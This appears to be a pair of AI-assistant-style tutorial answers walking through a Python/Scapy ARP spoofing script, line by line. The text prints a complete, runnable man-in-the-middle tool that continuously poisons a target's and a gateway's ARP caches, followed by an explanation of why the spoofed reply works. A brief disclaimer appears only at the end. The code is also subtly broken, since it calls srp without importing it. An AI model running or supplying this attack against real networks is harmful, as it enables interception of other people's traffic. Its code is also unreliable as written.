### What Is ARP Spoofing?
In ARP spoofing:
1. **Goal**: You make a device believe that your computer’s MAC address is associated with another IP (like the gateway or router).
2. **Effect**: The target device starts sending traffic meant for that IP address to you instead, allowing you to intercept, monitor, or redirect that traffic.

### Step-by-Step Explanation

#### 1. Import Necessary Modules

```python
from scapy.all import ARP, Ether, send
import time
import sys
```

- **`scapy.all`**: Scapy is a powerful Python library for network packet manipulation. We’re using it here to create ARP packets.
- **`time`**: Used to add delays between packets.
- **`sys`**: Standard Python module for system-specific functions (not critical here).

#### 2. `get_mac(ip)` Function

This function finds the **MAC address** of a device based on its **IP address**.

```python
def get_mac(ip):
    """Get the MAC address of a device with a given IP."""
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    response = srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    
    if response:
        return response[0][1].hwsrc
    else:
        print(f"No response for IP: {ip}")
        return None
```

Here’s what it does:
- **Create an ARP Request**: `ARP(pdst=ip)` creates an ARP request packet for the IP address (`pdst`) you provide.
- **Broadcast Packet**: `Ether(dst="ff:ff:ff:ff:ff:ff")` sets up a broadcast Ethernet packet, so all devices on the network see this ARP request.
- **Send and Receive**: `srp` (send and receive packets at the data link layer) sends this packet and waits for a response. If a device with the specified IP responds, we get its MAC address (`hwsrc`).

#### 3. `spoof(target_ip, spoof_ip)` Function

This function **sends a fake ARP response** to make the target device associate your MAC address with the IP of another device, like the gateway.

```python
def spoof(target_ip, spoof_ip):
    """Send an ARP reply to the target to associate the attacker's MAC address with the spoof IP."""
    packet = ARP(op=2, pdst=target_ip, hwdst=get_mac(target_ip), psrc=spoof_ip)
    send(packet, verbose=False)
```

Breaking it down:
- **Create the Fake ARP Packet**: `ARP(op=2, pdst=target_ip, hwdst=get_mac(target_ip), psrc=spoof_ip)`
  - `op=2` means it’s an ARP reply.
  - `pdst=target_ip` is the IP of the target device.
  - `hwdst=get_mac(target_ip)` is the target’s actual MAC address.
  - `psrc=spoof_ip` is the IP address we want to "spoof" (like the gateway).
- **Send the Packet**: `send(packet, verbose=False)` sends this packet, making the target believe that `spoof_ip` is associated with our MAC.

#### 4. `restore(target_ip, spoof_ip)` Function

This function **undoes the spoofing** by sending the correct ARP reply, restoring the original IP-to-MAC association.

```python
def restore(target_ip, spoof_ip):
    """Restore the normal ARP table on the target by sending the correct association."""
    target_mac = get_mac(target_ip)
    spoof_mac = get_mac(spoof_ip)
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=spoof_mac)
    send(packet, count=4, verbose=False)
```

What’s happening here:
- **Retrieve Actual MAC Addresses**: It finds the real MAC address of both `target_ip` and `spoof_ip`.
- **Create and Send the Correct ARP Packet**: An ARP reply (`op=2`) with the real IP-MAC association is sent four times (`count=4`), ensuring the target device’s ARP cache is updated with the correct information.

#### 5. Main Program Loop

Finally, we combine these functions in a loop to continually spoof the target device.

```python
# Replace with actual target and spoof IPs
target_ip = "192.168.1.10"     # Target device IP
gateway_ip = "192.168.1.1"      # Gateway IP

try:
    print("[*] Starting ARP spoofing...")
    while True:
        spoof(target_ip, gateway_ip)    # Spoof the target into thinking we are the gateway
        spoof(gateway_ip, target_ip)    # Spoof the gateway into thinking we are the target
        time.sleep(2)  # Wait a moment before sending another spoofing packet
except KeyboardInterrupt:
    print("\n[*] Detected CTRL+C, restoring network...")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
    print("[*] ARP table restored. Exiting.")
```

- **Define the Target and Gateway IPs**: Set the IPs for the device and gateway.
- **Start Spoofing in a Loop**: `spoof(target_ip, gateway_ip)` and `spoof(gateway_ip, target_ip)` continuously send spoofed packets to both the target and gateway.
  - **Sleep Timer**: `time.sleep(2)` waits 2 seconds before repeating the spoofing. This keeps the ARP cache poisoned.
- **Handle Exit and Restoration**: Pressing `CTRL+C` triggers the `except` block, which runs `restore()` for both the target and gateway to reset the network to its original state.

### Summary
- **`get_mac`**: Gets the MAC address of a device.
- **`spoof`**: Sends a fake ARP response to mislead the target about which MAC address is associated with a certain IP.
- **`restore`**: Sends correct ARP responses to reverse the spoofing.
- **Loop**: Continually poisons the ARP cache until stopped, then restores it on exit.

This code is for educational purposes and should be used responsibly in a controlled environment. ARP spoofing on networks without permission is illegal and can lead to serious consequences.

Absolutely, let’s break down exactly how the gateway IP becomes associated with your MAC address in the target device’s ARP table. I’ll show you how this happens in the code with a focus on key parts and walk you through how each step contributes to associating your MAC address with the gateway’s IP.

### Step-by-Step Code Explanation: Associating Gateway IP with Your MAC Address

Here's the relevant function from the code that performs the spoofing:

```python
def spoof(target_ip, spoof_ip):
    packet = ARP(op=2, pdst=target_ip, hwdst=get_mac(target_ip), psrc=spoof_ip)
    send(packet, verbose=False)
```

Each parameter in this `ARP` packet creation has a specific role in tricking the target. Here’s what each part does and why it causes the gateway IP to become associated with your MAC address.

#### Breaking Down the ARP Packet

1. **`op=2`**: This indicates an ARP reply (as opposed to an ARP request). In normal circumstances, an ARP reply is only sent after an ARP request. However, ARP doesn’t verify whether a request was actually made, so you can send unsolicited ARP replies to trick devices into accepting new information.

2. **`pdst=target_ip`**: This is the **target’s IP address**—the device you want to spoof (the one you want to fool into associating your MAC with the gateway’s IP). This makes sure the packet is sent specifically to the target.

3. **`hwdst=get_mac(target_ip)`**: This is the **target’s MAC address**. It specifies that the ARP reply is directed to the target, ensuring that the target device is the one that will receive and process this packet.

4. **`psrc=spoof_ip`**: This is the **IP address you’re pretending to be**. In this case, it’s the IP of the gateway (`192.168.1.1`). This makes the target device believe the reply is coming from the gateway, even though it’s actually coming from you.

5. **Implicitly, `hwsrc` (Your MAC Address)**: The `hwsrc` parameter isn’t specified here, so it defaults to **your MAC address** (the MAC address of the device running this script). This is the key part that makes the spoofing work: when the target device receives this ARP reply, it updates its ARP table to say, “The MAC address for the IP `192.168.1.1` (the gateway) is [your MAC address].”

#### How This Causes the Target to Associate the Gateway IP with Your MAC Address

- When the target receives this ARP reply, it interprets it as, “The device with IP `192.168.1.1` (the gateway) has the MAC address [your MAC address].”
- The target updates its ARP table, associating `192.168.1.1` with your MAC address. Now, every time the target device tries to communicate with `192.168.1.1`, it will send the packets to your MAC address instead.
  
In summary:
- **`psrc=spoof_ip`** tells the target device that this ARP packet is about the gateway’s IP address.
- **`hwsrc` defaults to your MAC address**, so the target device associates that IP (the gateway’s) with your MAC.

#### The Continuous Spoofing Loop

To keep this association active, the script sends this spoofed ARP packet repeatedly:

```python
while True:
    spoof(target_ip, gateway_ip)
    spoof(gateway_ip, target_ip)
    time.sleep(2)
```

- **`spoof(target_ip, gateway_ip)`**: This associates the gateway’s IP with your MAC address in the target’s ARP table.
- **`spoof(gateway_ip, target_ip)`**: This does the reverse—associating the target’s IP with your MAC address in the gateway’s ARP table (optional for a full man-in-the-middle attack).

The result is that:
1. **On the Target**: The gateway IP is now linked to your MAC address, so any packets meant for the gateway go to you.
2. **On the Gateway** (if spoofed): The target IP is linked to your MAC address, so any packets meant for the target go through you.

By repeating this continuously, you ensure the ARP tables stay “poisoned” with your MAC address as the replacement for the gateway’s or target’s MAC address.

---

### Summary
The line `packet = ARP(op=2, pdst=target_ip, hwdst=get_mac(target_ip), psrc=spoof_ip)` is the key to associating the gateway’s IP with your MAC address. It does this by:

- **Setting `psrc=spoof_ip`** to pretend to be the gateway’s IP.
- **Using your MAC address as `hwsrc`**, which tricks the target into linking the gateway’s IP with your MAC.

This causes all traffic meant for the gateway to be sent to you instead.
